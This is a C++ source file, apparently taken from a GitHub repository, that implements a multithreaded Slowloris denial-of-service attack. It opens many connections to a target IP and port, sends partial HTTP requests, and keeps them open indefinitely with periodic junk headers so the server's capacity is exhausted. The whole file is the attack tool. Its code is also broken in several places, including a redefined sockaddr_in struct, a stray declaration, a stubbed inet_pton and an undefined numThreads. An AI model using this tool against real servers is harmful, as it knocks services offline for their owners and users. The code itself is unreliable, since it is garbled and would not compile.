//https://github.com/Folk4681/SlowLorisDDoSAttackCPP/blob/master/slowlorisattackmultithread.cpp
//slowlorisattackmultithread.cpp - std = c++0x - pthread - o out

//while compiling in the command line, flags -std=c++0x and -pthread must be set

#include <stdio.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <sys/types.h>  //used for various socket attributes, and multi-threading ~ winsock for linux
#include <sys/socket.h> //socket defined here ~ winsock for linux
#include <netinet/in.h> //contains information regarding victim ip, port, family
#include <arpa/inet.h> //parses ip address into network readable
#include <cstring> //used for strlen()
#include <vector>  //expandable list
#include <unistd.h> //sleep function
#include <thread> //multi-threading

using namespace std;

int ARGS = 4;

struct sockaddr_in
{
	string sin_family; //AF_INET
	string sin_port; //htons(victimPORT);
}; sockaddr_in

void initialSendSocket(int socketNum) {
	char incompleteHeader[255];
	//+ post
	sprintf(incompleteHeader, "GET /%d HTTP/1.1\r\n", (rand() % 99999));
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
	sprintf(incompleteHeader, "Host: \r\n");
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
	//+ webpack 
	sprintf(incompleteHeader, "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
	sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % 99999 + 1000));
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
}

void spamPartialHeaders(struct sockaddr_in victim, vector<int> socketList, int totalSockets) {
	for (int i = 0; i < totalSockets; i++) {
		//cout << "Piping packets... " << endl;
		try {
			char incompleteHeader[50];
			sprintf(incompleteHeader, "X-a: %d\r\n", (rand() % 99999));
			send(socketList.at(i), incompleteHeader, strlen(incompleteHeader), 0);
		}
		catch (exception e) {
			socketList.erase(socketList.begin() + i);
			socketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
			connect(socketList.at(totalSockets - 1), (struct sockaddr*)&victim, sizeof(victim));
			initialSendSocket(socketList.at(i));
		}
	}
}

void inet_pton() {

}

int main(int argc, char* argv[]) {

	string arg[] = {"ip", "Port" , "num of sockets", "num of threads"};

	const char* victimIP = argv[1];
	unsigned short victimPORT = atoi(argv[2]);
	int totalSockets = atoi(argv[3]);
	//const int NUM_THREADS= atoi(argv[4]);
	const int NUM_THREADS = 5;
	thread threadArray[NUM_THREADS];

	int socketDensity = totalSockets / numThreads;

	vector<vector<int>> socketListPartitions;

	struct sockaddr_in victim;
	victim.sin_family = AF_INET;
	victim.sin_port = htons(victimPORT);

	//todo make interface
	inet_pton(AF_INET, victimIP, &victim.sin_addr);

	for (int i = 0; i < numThreads; i++) {
		vector<int> currentSocketList;
		int numSockets = ((i == (numThreads - 1)) ? (socketDensity + totalSockets % numThreads) : socketDensity);
		for (int j = 0; j < numSockets; j++) {
			currentSocketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
			if (currentSocketList.at(j) < 1) {
				cout << "Could not create socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
				return(0);
			}
			cout << "Successfully created socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
			int check = connect(currentSocketList.at(j), (struct sockaddr*)&victim, sizeof(victim));
			if (check < 0) {
				cout << "Could not connect socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
				cout << "Perhaps a nonexistent IP or unopened port?" << endl;
				return(0);
			}
			cout << "Successfully connected socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
			initialSendSocket(currentSocketList.at(j));
			cout << "Successfully sent incomplete header for socket " << j + 1 << " on thread #" << i + 1 << "." << endl;
		}

		socketListPartitions.push_back(currentSocketList);

		cout << "--------" << endl;
	}

	cout << "------------------" << endl;

	int iterations = 1;
	while (true) {
		cout << "Restarting attacks.." << endl;
		for (int i = 0; i < numThreads; i++) {
			cout << "Keeping sockets on thread #" << i + 1 << " open.." << endl;
			threadArray[i] = thread(spamPartialHeaders, victim, socketListPartitions.at(i), (socketListPartitions.at(i).size()));
			cout << "Attacks were successful on thread #" << i + 1 << "." << endl;
		}

		for (int i = 0; i < numThreads; i++) {
			threadArray[i].join();
			cout << "Attacks on thread #" << i + 1 << " paused." << endl;
		}
		cout << "Iteration " << iterations << " completed." << endl;
		iterations++;
		cout << "Sleeping for 15 seconds... " << endl;
		sleep(15);
		cout << "------------" << endl;
	}

}